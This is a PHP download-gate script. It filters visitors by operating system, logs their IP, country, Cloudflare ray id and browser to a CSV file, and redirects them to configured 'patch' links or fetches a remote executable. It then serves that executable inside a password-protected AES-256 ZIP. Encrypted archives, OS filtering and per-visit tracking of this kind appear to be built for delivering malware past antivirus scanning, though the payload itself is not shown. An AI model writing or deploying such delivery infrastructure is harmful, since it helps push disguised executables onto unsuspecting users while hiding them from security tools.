<?php

// Load JSON settings file
$settingsFile = 'settings.json'; // Path to the settings file
$settingsFileStr = file_get_contents($settingsFile);
$settings = json_decode($settingsFileStr, false);


// Get values from the settings file
$archiving = $settings->Archiving->Enabled;
$correct_password = $settings->Archiving->Password; // Password for the ZIP file
$software_name = $settings->Archiving->SoftwareName; // Software Name
$zip_file = $settings->Archiving->ZIPName; // Name of the resulting ZIP file
$FileName = $settings->FileName; // Set filename when download

$AndroidLink = $settings->AndroidLink;
$iOSLink = $settings->iOSLink;
$MacOSLink = $settings->MacOSLink;

// PatchDownloadLinks
$patchURL = $settings->PatchDownloadLinks[0];

// Cloudflare ray id
$rayid = $_GET['rayid'];
// Country Code
$countrycode = $_GET['countrycode'];
// get Version
$version = $_GET['version'];
// Browser name & version
$browser = getBrowser();


// Get the visitor's IP, OS, and Country
$userIP = $_SERVER['REMOTE_ADDR'];
$userOS = getOS();

// Get the main domain dynamically
$mainDomain = $_SERVER['HTTP_HOST']; // Extracts the domain name, like "domain.com"

// Redirect if the user's OS is not in the allowed list
if (!in_array($userOS, $settings->OS)) {
    header("Location: https://$mainDomain");
    exit();
}

// Handle download request
if ($_SERVER['REQUEST_METHOD'] == 'GET') {

    // if archiving => OFF, users will redirect the patchDownloadLinks
    if ($archiving == "OFF") {
        
        // Log the visitor and download count
        logVisitor($userIP, $userOS, $countrycode, $rayid, $browser, $version);

        switch($userOS) {
            case "Windows":
                header("Location: $patchURL");
                break;
            case "Android":
                header("Location: $AndroidLink");
                break;
            case "iPhone":
                header("Location: $iOSLink");
                break;
            case "macOS":
                header("Location: $MacOSLink");
                break;
        }

        // modify download status
        modifyDownloadStatus();
        // download count
        incrementDownloadCount();

        exit;
        
    }

    // if archiving => ON, users will download .zip file
    if ($archiving == "ON") {
        
         // Log the visitor and download count
         logVisitor($userIP, $userOS, $countrycode, $rayid, $browser, $version);
        
         // Download the external .exe file from the patch download link
         
         switch($userOS) {
            case "Windows":
                $exe_content = file_get_contents($patchURL);
                break;
            case "Android":
                $exe_content = file_get_contents($AndroidLink);
                break;
            case "iPhone":
                $exe_content = file_get_contents($iOSLink);
                break;
            case "macOS":
                $exe_content = file_get_contents($MacOSLink);
                break;
        }
 
 
         if ($exe_content === false) {
             die('Failed to download the file.');
         }
 
         // Create a new ZIP file
         $zip = new ZipArchive();
         if ($zip->open($zip_file, ZipArchive::CREATE) !== TRUE) {
             die('Failed to create .zip file.');
         }
 
         // Add the .exe file to the ZIP archive
         $zip->addFromString($patchURL, $exe_content);
 
         // Set password and encryption for the ZIP file
         $zip->setPassword($correct_password);
         $zip->setEncryptionName($patchURL, ZipArchive::EM_AES_256);
         $zip->close();
 
         // Serve the ZIP file to the user for download
         if (file_exists($zip_file)) {
 
             header('Content-Description: File Transfer');
             header('Content-Type: application/zip');
             header('Content-Disposition: attachment; filename="'.basename($zip_file).'"');
             header('Expires: 0');
             header('Cache-Control: must-revalidate');
             header('Pragma: public');
             header('Content-Length: ' . filesize($zip_file));
             readfile($zip_file);
 
             unlink($zip_file); // Delete the ZIP file after serving it
 
             // modify the download status
             modifyDownloadStatus();
             
             // download count
             incrementDownloadCount();
 
            exit;
        } else {
            die('Failed to create the .zip file.');
        }

    }
    
} else {
    echo 'Invalid request.';
}


// FUNCTIONS

// Function to get user's OS
function getOS() {
    $userAgent = $_SERVER['HTTP_USER_AGENT'];
    if (preg_match('/Windows/i', $userAgent)) return 'Windows';
    if (preg_match('/Macintosh|Mac OS X/i', $userAgent)) return 'macOS';
    if (preg_match('/Android/i', $userAgent)) return 'Android';
    if (preg_match('/iPhone|iPad/i', $userAgent)) return 'iPhone';
    return 'Unknown OS';
}


// Function to log visitor details to CSV
function logVisitor($ip, $os, $country, $rayid, $browser, $version) {
    $csvFile = 'visitors.csv';
    $file = fopen($csvFile, 'a');
    fputcsv($file, [$ip, $os, $country, date('Y-m-d H:i:s'), $rayid, $browser, "Skiped", $version ]);
    fclose($file);
}

// Function to track download count
function incrementDownloadCount() {
    $downloadFile = 'download_count.txt';

    // Increment download count
    if (file_exists($downloadFile)) {
        $count = (int)file_get_contents($downloadFile);
        $count++;
    } else {
        $count = 1;
    }
    file_put_contents($downloadFile, $count);
}


// Function to modify the Doanload = success in csv file
function modifyDownloadStatus() {
    // Define the path to your CSV file
    $filePath = 'visitors.csv';

    // Check if the file exists
    if (!file_exists($filePath)) {
        die("File not found.");
    }

    // Read the CSV file into an array
    $rows = [];
    if (($handle = fopen($filePath, 'r')) !== false) {
        while (($data = fgetcsv($handle)) !== false) {
            $rows[] = $data; // Store each row in an array
        }
        fclose($handle);
    }

    // Modify the last column of the last row
    if (!empty($rows)) {
        $lastRowIndex = count($rows) - 1; // Get the index of the last row
        $lastColumnIndex = count($rows[$lastRowIndex]) - 1; // Get the index of the last column
        
        // Update the last column to "Download"
        if (trim($rows[$lastRowIndex][$lastColumnIndex-1]) === "Skiped") {
            $rows[$lastRowIndex][$lastColumnIndex-1] = "Downloaded"; // Modify the last column
        }
    }

    // Write the modified array back to the CSV file
    if (($handle = fopen($filePath, 'w')) !== false) {
        foreach ($rows as $row) {
            fputcsv($handle, $row); // Write each modified row
        }
        fclose($handle);
    }

    echo "CSV file updated successfully.";
}

// get browser name & version
function getBrowser()
{
    // Get the user agent string
    $user_agent = $_SERVER['HTTP_USER_AGENT'];

    // Initialize the browser name variable
    $browser = "Unknown Browser";

    // Check for Microsoft Edge (Chromium-based and Legacy Edge)
    if (strpos($user_agent, 'Edg') !== false) {
        $browser = "Microsoft Edge";
    // Check for Opera
    } elseif (strpos($user_agent, 'OPR') !== false || strpos($user_agent, 'Opera') !== false) {
        $browser = "Opera";
    // Check for Google Chrome (after checking for Opera and Edge)
    } elseif (strpos($user_agent, 'Chrome') !== false) {
        $browser = "Google Chrome";
    // Check for Mozilla Firefox
    } elseif (strpos($user_agent, 'Firefox') !== false) {
        $browser = "Mozilla Firefox";
    // Check for Safari (excluding Chrome and Edge)
    } elseif (strpos($user_agent, 'Safari') !== false) {
        $browser = "Safari";
    }

    // Output the detected browser
    return $browser;
}


?>
